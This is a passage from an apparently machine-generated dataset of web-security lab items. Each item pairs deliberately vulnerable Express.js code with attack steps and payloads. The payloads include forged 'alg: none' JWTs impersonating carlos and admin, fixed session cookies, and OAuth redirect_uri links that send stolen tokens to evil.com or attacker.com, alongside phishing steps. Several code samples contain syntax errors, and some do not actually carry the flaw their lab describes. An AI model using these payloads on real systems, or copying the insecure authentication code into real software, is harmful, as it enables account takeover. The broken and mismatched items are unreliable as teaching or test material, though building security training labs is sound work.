      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['carlos', 'admin', 'wiener']; app.get('/my-account', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Not logged in'); const decoded = jwt.decode(token, { complete: true }); if (!decoded || !decoded.payload.username) return res.status(403).send('Invalid token'); if (!users.includes(decoded.payload.username)) return res.status(403).send('User not found'); res.send(`Account page for ${decoded.payload.username}`); }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via pre-authenticated session reuse in login handler",
      "Lab Description": "This application mishandles session IDs and does not issue a new session upon successful authentication. The attacker can set a fixed session ID before login and trick a victim into logging in with that same session. To solve: Log in as Carlos by forcing a session ID and reusing it post-login.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start a browser session and use Burp Suite to intercept the GET /login request.",
        "Modify the request to include a custom cookie: session=attacker123.",
        "Send the link with the crafted session cookie to Carlos and simulate a login using social engineering or CSRF.",
        "Once Carlos logs in, reuse the same session cookie (attacker123) from your browser.",
        "Visit /account to confirm the session is authenticated as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'weak-secret', resave: false, saveUninitialized: true })); const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "Cookie: session=attacker123",
        "http://victim-site.com/login?phpsessid=attacker123",
        "Set-Cookie: session=attacker123; Path=/; HttpOnly"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation in authorization endpoint",
      "Lab Description": "This application implements OAuth2 authorization but fails to strictly validate redirect URIs, allowing attackers to manipulate the flow and steal access tokens. The authorization server trusts unvalidated 'redirect_uri' values. To solve: Capture a valid OAuth token for Carlos and use it to call the protected /api/user endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to intercept the OAuth request initiated by the client and observe the redirect_uri parameter.",
        "Modify the redirect_uri parameter to point to your attacker-controlled domain (http://evil.com/callback).",
        "Send a phishing link with the modified URL to Carlos to trick him into authorizing.",
        "Capture the token in your hosted endpoint (http://evil.com/callback?access_token=...).",
        "Replay the stolen access token using Postman to call GET /api/user with Authorization: Bearer <token>."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') { const token = 'carlos-oauth-token'; tokens[username] = token; res.redirect(`${redirect_uri}?access_token=${token}`); } else { res.status(400).send('Missing user'); } }); app.get('/api/user', (req, res) => { const authHeader = req.headers.authorization; if (authHeader && authHeader === 'Bearer carlos-oauth-token') { res.send('User: carlos, Email: carlos@example.com'); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "http://localhost:4000/auth?username=carlos&redirect_uri=http://evil.com/callback",
        "GET /api/user HTTP/1.1\nAuthorization: Bearer carlos-oauth-token",
        "http://victim-app.com/auth?redirect_uri=http://attacker.tld/callback"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in session management",
      "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it fails to properly verify the token's signature. The `alg` field in the JWT header is set to `none`, and the application accepts tokens without verifying their integrity. The application trusts all fields in the token, including the `username` claim. To solve: Forge a JWT that impersonates the user 'carlos' and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture the JWT from a login request using Burp Suite.",
        "Use jwt.io or Burp Decoder to inspect the token and note the use of 'alg':'none'.",
        "Craft a new token with the payload {\"username\":\"carlos\"} and set the alg to none, leaving the signature blank.",
        "Replace your JWT cookie with the forged token using Burp's Modify Cookie feature.",
        "Refresh the /my-account endpoint and confirm access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(require('cookie-parser')()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'none' }); res.cookie('auth', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token); if (decoded && decoded.username === 'carlos') { res.send('Account details for carlos'); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "JWT with header: {\"alg\":\"none\"} and payload: {\"username\":\"carlos\"}"
      ]
    },
    {
      "Lab scenario": "OAuth token misconfiguration in API gateway authorization",
      "Lab Description": "The API gateway uses OAuth tokens for authorization. However, it fails to validate the 'aud' claim in the access token. This allows an attacker to reuse a token issued for a different client (token confusion). To solve: Use a valid OAuth access token from your own app and access the protected endpoint of a privileged client to view Carlos's email address.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to obtain a valid OAuth token from your registered client using the authorization code flow.",
        "Inspect the token in jwt.io and note the 'aud' claim is not specific to your client.",
        "Send a GET request to /api/client-a/data with your token in the Authorization header.",
        "Observe that the endpoint accepts your token and returns privileged data.",
        "Extract Carlos’s email address from the response to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); const payload = jwt.decode(token); req.user = payload; next(); }); app.get('/api/client-a/data', (req, res) => { if (req.user && req.user.scope.includes('read:data')) { res.json({ email: 'carlos@example.com' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "OAuth token from Client-B reused on Client-A’s endpoint",
        "Valid JWT with aud mismatch: {\"aud\":\"Client-B\", \"scope\":\"read:data\"}",
        "Access token from attacker app reused on protected resource"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login handler",
      "Lab Description": "The application assigns session identifiers before authentication and does not regenerate them after login. This allows an attacker to set a fixed session and trick a victim into logging in under a known session ID. The attacker can then hijack the session. To solve: Fix a session, get Carlos to authenticate into it, and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to browse to the site and capture the Set-Cookie header with session ID before login.",
        "Send a crafted link to Carlos with the fixed session ID via social engineering or intercept his browser.",
        "Once Carlos logs in using the fixed session, reuse the same session ID in your browser.",
        "Access /my-account with the hijacked session and confirm it loads Carlos’s account.",
        "Validate the login success through a post-login token or visual change."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('Welcome to vulnerable site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { sessions[req.cookies.sid] = 'carlos'; res.send('Logged in'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); const PORT = 8080; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Fixed session ID: sid=knownvalue",
        "Trick victim into authenticating under sid=knownvalue",
        "Access /my-account with same sid cookie"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in API authorization",
      "Lab Description": "This lab exposes a REST API that uses JSON Web Tokens (JWTs) to control access. The server trusts the 'alg' field in the JWT header and does not validate its signature properly when 'alg' is set to 'none'. The application accepts user-supplied tokens without enforcing signature validation. To solve: craft a forged token to impersonate the admin user and access the protected /admin endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to intercept a legitimate login request and capture the JWT returned in the Authorization header.",
        "Decode the JWT using jwt.io and inspect the payload structure and algorithm used.",
        "Change the alg header to 'none' and modify the payload's 'user' field to 'admin'. Remove the signature entirely.",
        "Use Postman to send a GET request to /admin with the manipulated JWT in the Authorization header.",
        "Verify access by confirming the admin panel content is returned in the response."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { role: 'admin' }, 'user': { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Admin Access Granted'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT Lab running on http://localhost:${PORT}));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "This lab has a vulnerable login flow where session identifiers are issued before authentication and not regenerated after login. The session ID is predictable and can be shared across users. The application sets a cookie named session_id which is trusted without being rotated post-login. To solve: fix a session ID before login and force the victim to use it to hijack their authenticated session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to initiate a login flow and observe the issued session_id cookie prior to login.",
        "Note the format of the session ID (e.g., static prefix + incremental token).",
        "Send the login page with the fixed session ID to the victim (simulated).",
        "After the victim logs in using that session, reuse the same session ID in your browser.",
        "Access the /my-account endpoint using the fixed session ID and confirm access to victim's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = { 'carlos': { password: 'secret', accountData: 'Sensitive Info' } }; app.get('/login', (req, res) => { let sid = 'sess_' + Math.floor(Math.random() * 1000); res.cookie('session_id', sid); res.send('Login page with pre-issued session'); }); app.post('/login', (req, res) => { let sid = req.cookies.session_id; let { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { let user = sessions[req.cookies.session_id]; if (user) res.send('Account data: ' + users[user].accountData); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
      "payloads": [
        "Cookie: session_id=sess_1337",
        "POST /login with Cookie: session_id=sess_1337",
        "GET /my-account with Cookie: session_id=sess_1337"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration token reuse attack",
      "Lab Description": "This lab simulates an OAuth authorization server that fails to validate audience claims (aud) on access tokens. As a result, tokens issued for one client can be reused against another. The client application does not verify whether the token was issued for its own audience. To solve: use a token issued for one OAuth client to access a protected endpoint in another context.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP or Postman to initiate OAuth flow and obtain an access token for a benign client (e.g., photo app).",
        "Decode the JWT access token and inspect the 'aud' claim which incorrectly allows all resources.",
        "Send the same token to a different application (e.g., finance app) that incorrectly skips audience validation.",
        "Use Postman to call GET /finance-data endpoint with the reused access token.",
        "Verify successful access and extract user financial data to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const financeData = { 'carlos': 'Bank Balance: $9000' }; app.get('/finance-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, 'oauthsharedsecret');  if (payload.sub === 'carlos') { return res.send(financeData['carlos']); } return res.status(403).send('Access Denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(OAuth Lab running on http://localhost:${PORT}));",
      "payloads": [
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJwaG90by1hcHAifQ.mFMeNz9sZHXvl_YceRmJRW2skH43FF3A54gtpPYsOKo",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJhbGwifQ._DztOQpn9jK9i8I1vGE-FhKo8zEl5EtXfU2RoHOuWUs"
      ]
    },
    {
      "Lab scenario": "Session fixation via flawed login redirect",
      "Lab Description": "This lab implements a login flow that improperly handles session tokens. The application creates a session ID before authentication and does not regenerate it upon successful login. An attacker can abuse this behavior to fix their own session ID on a victim’s account. To solve: Hijack Carlos’s session by forcing a session ID fixation and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite Proxy to intercept GET /login request while logged out.",
        "Observe Set-Cookie header assigning a session value before login. Send this request to Burp Repeater.",
        "Note the fixed session value, and manually craft a phishing link: /login?sessionid=attackerSessionValue.",
        "Log in with Carlos’s credentials while preserving the attacker’s pre-set session ID.",
        "Verify that the session persists across pages by navigating to /account with attacker’s session value."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send('Account page for ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "GET /login?sessionid=attackerSession123",
        "POST /login HTTP/1.1 with Cookie: session=attackerSession123",
        "GET /account HTTP/1.1 with Cookie: session=attackerSession123"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion leading to privilege escalation",
      "Lab Description": "This lab uses JWT for session management but accepts unsigned tokens by trusting the 'alg' value from the token header. This allows attackers to change the algorithm to 'none' and forge tokens with elevated privileges. To solve: Craft a forged token granting admin privileges and access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a JWT using Burp Suite while logged in as a normal user.",
        "Decode the JWT using jwt.io or Postman and observe 'alg': 'HS256'.",
        "Modify the header to 'alg': 'none' and add \"role\":\"admin\" to payload.",
        "Remove the signature and send the forged token using Burp Repeater.",
        "Send a GET request to /admin with the forged token as Authorization: Bearer [token] and confirm admin access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); } catch { res.status(400).send('Invalid token'); } }); app.listen(3000);",
      "payloads": [
        "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
        "Authorization: Bearer [unsigned JWT with admin role]",
        "GET /admin HTTP/1.1 with unsigned token"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leaking authorization codes",
      "Lab Description": "This lab uses OAuth for third-party login but fails to validate the redirect_uri properly. An attacker can abuse this to capture an authorization code meant for another user. To solve: Hijack Carlos’s OAuth code and use it to log in as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to analyze the OAuth flow and locate redirect_uri parameter.",
        "Craft a malicious redirect_uri under attacker’s control (e.g., https://attacker.com/callback).",
        "Send phishing link to Carlos: /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback",
        "Capture Carlos’s code via attacker-controlled endpoint.",
        "Send a request to /token endpoint exchanging the stolen code for an access token, then use it to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const oauthCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; oauthCodes[code] = 'carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-carlos') res.send('Welcome back, carlos!'); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "/auth?client_id=lab-client&redirect_uri=https://attacker.com/callback&state=1234",
        "POST /token HTTP/1.1 with code=authcode123",
        "Authorization: Bearer token-carlos",
        "GET /my-account HTTP/1.1 with Bearer token-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation via unvalidated token reuse in REST login flow",
      "Lab Description": "The application improperly handles session identifiers during login, allowing a pre-auth session token to persist after authentication. The application sets a session cookie before authentication and does not regenerate it upon successful login. To solve: Hijack a logged-in session by fixing the session ID prior to user authentication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept GET /login and record the pre-auth Set-Cookie header.",
        "Send a POST /login request using valid credentials but with the previously issued session cookie manually added.",
        "Observe that the session cookie remains unchanged after login, indicating successful fixation.",
        "Send the fixed session cookie to another browser and reuse it after the victim logs in.",
        "Access /my-account endpoint using the fixed cookie and verify session hijack."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': 'letmein123' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page loaded'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password && sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "POST /login HTTP/1.1 with Cookie: sid=sess_fixation",
        "GET /my-account HTTP/1.1 with Cookie: sid=sess_fixation"
      ]
    },
    {
      "Lab scenario": "JWT token signature spoofing using 'none' algorithm in Authorization header",
      "Lab Description": "The application uses JWTs for stateless session management but fails to enforce proper signature verification. The JWT validation logic accepts 'alg: none', allowing tampering of token payload. To solve: Forge a JWT for user carlos with 'admin: true' and access the protected resource.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to login and capture the JWT from the Authorization: Bearer header.",
        "Decode the JWT and inspect the algorithm field in the header section.",
        "Craft a new JWT with {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"admin\":true}, and remove the signature.",
        "Replace the original token with the unsigned forged token in Authorization header.",
        "Send GET /admin/dashboard and verify privileged access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; const users = { 'carlos': 'hunter2' }; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, admin: false }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.admin) return res.send('Admin Dashboard'); res.status(403).send('Access Denied'); } catch { res.status(400).send('Invalid Token'); } }); app.listen(4001);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
        "Authorization: Bearer [forged_none_algo_token]"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect on callback endpoint",
      "Lab Description": "The application uses OAuth for third-party login, but the redirect_uri parameter is not properly validated. This allows attackers to manipulate the OAuth flow and leak authorization codes or access tokens to malicious domains. To solve: Capture Carlos’s access token via redirect hijack and access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to intercept the OAuth login flow and locate the redirect_uri in the authorization request.",
        "Replace redirect_uri with a malicious domain under your control (e.g., https://evil.com/callback).",
        "Send the modified OAuth login link to Carlos and trigger login via phishing or XSS.",
        "Capture the authorization code sent to your server and exchange it for an access token.",
        "Use the stolen access token in Authorization header to access /user/profile."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'mock_code_123'; res.redirect(redirect + '?code=' + code); }); app.get('/callback', async (req, res) => { const code = req.query.code; try { const tokenRes = await axios.post('https://oauth-provider/token', { code }); const token = tokenRes.data.access_token; res.send('Logged in with token: ' + token); } catch { res.status(500).send('OAuth Error'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_oauth_token') { res.send('Carlos profile'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4002);",
      "payloads": [
        "https://app.com/auth?redirect_uri=https://evil.com/callback",
        "Authorization: Bearer carlos_oauth_token"
      ]
    },
    {
      "Lab scenario": "JWT tampering via none algorithm in Authorization header",
      "Lab Description": "The application implements JWT-based authorization but does not properly validate the signing algorithm. It accepts tokens with the 'alg' field set to 'none', allowing attackers to craft unsigned tokens. The application processes JWTs sent via the 'Authorization: Bearer' header. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman or Burp Suite to capture the Authorization header after a successful login.",
        "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' value in the header section.",
        "Modify the JWT by replacing the 'alg' value with 'none', and change the payload to {\"username\":\"carlos\"}. Remove the signature completely.",
        "Send the modified token using the Authorization: Bearer header in a GET request to /my-account endpoint.",
        "Verify successful access to Carlos's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: 'admin123' }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const payload = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ==."
      ]
    },
    {
      "Lab scenario": "Session fixation via login endpoint",
      "Lab Description": "The session ID is generated and sent to the client before authentication. Upon successful login, the same session ID is preserved instead of issuing a new one. This allows an attacker to fix a session ID for the victim. To solve: fix the session ID before Carlos logs in, then use the same session to access his account after he logs in.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to generate a session by visiting /login page before authentication and intercept the Set-Cookie response containing sessionID.",
        "Send a phishing link to Carlos that causes him to log in using that same sessionID (assume he logs in via crafted link).",
        "Once Carlos logs in, reuse the same sessionID cookie value to access /my-account endpoint.",
        "Send the sessionID in your cookie header using Burp Repeater to GET /my-account.",
        "Verify access to Carlos’s account using fixed session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard-cat', resave: false, saveUninitialized: true })); const users = { carlos: 'secure123' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "Cookie: connect.sid=attackerFixedSessionID",
        "GET /my-account HTTP/1.1 with attackerFixedSessionID after victim login"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow redirection manipulation",
      "Lab Description": "The app uses OAuth implicit flow for authentication. The redirection URL validation is flawed, allowing attackers to steal tokens by injecting a malicious redirect_uri. The app accepts OAuth token from third-party providers and uses them to authenticate users via GET /oauth/callback. To solve: hijack Carlos’s token by crafting a malicious redirect_uri that sends the token to your server.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp or Postman to analyze the OAuth authorization URL parameters, especially redirect_uri.",
        "Replace the redirect_uri parameter with a malicious value pointing to your server (e.g., https://attacker.com/callback).",
        "Send the malicious link to Carlos and make him click it (assume victim interaction).",
        "Intercept the fragment token at your server from Carlos’s browser redirection.",
        "Replay the token in GET /oauth/callback?token=xyz to impersonate Carlos and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token === 'carlos_token') { res.send('Welcome back, carlos!'); } else { res.send('Invalid token'); } }); app.get('/start-auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${redirect}#token=carlos_token`); }); app.listen(4000);",
      "payloads": [
        "https://vulnerable-site.com/start-auth?redirect_uri=https://attacker.com/callback",
        "https://attacker.com/callback#token=carlos_token",
        "GET /oauth/callback?token=carlos_token"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Bypass in API Token Validation",
      "Lab Description": "The API backend uses JWT for authentication, but fails to validate the signature properly when the `alg` header is manipulated. The application uses the token directly from the Authorization header to identify users without verifying the token's integrity. To solve: Forge a valid JWT token that grants admin access by bypassing the signature verification logic.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to intercept and inspect the Authorization Bearer token from a normal login request.",
        "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm used (`alg: HS256`).",
        "Modify the JWT header to `alg: none` and remove the signature part entirely.",
        "Craft a new payload with `{ \"role\": \"admin\", \"username\": \"carlos\" }` and encode the header and payload with base64url.",
        "Replace the Authorization header with the tampered token and access the `/admin` or `/my-account` endpoint to confirm privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') { res.send('Admin access granted'); } else { res.send('User access only'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session Fixation in Login Token Parameter",
      "Lab Description": "The login flow uses a static session token passed in a GET parameter without proper regeneration after login. This allows a malicious actor to predetermine the victim's session ID. The application reflects the token into a cookie without regenerating it post-authentication. To solve: Fix the victim's session ID, force a login, and then reuse the session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to monitor the login flow and observe the use of `?session=` token in GET requests.",
        "Generate a session ID and pre-authenticate using it, confirming that it sets a `Set-Cookie: session` header with the same ID.",
        "Send the login link containing the malicious session ID to the victim.",
        "After the victim logs in using that link, reuse the same session cookie on your own browser or via Burp Repeater.",
        "Access `/my-account` with the hijacked session to confirm access to the victim's data."
      ],
      "Vulnerability name": "Authentication",
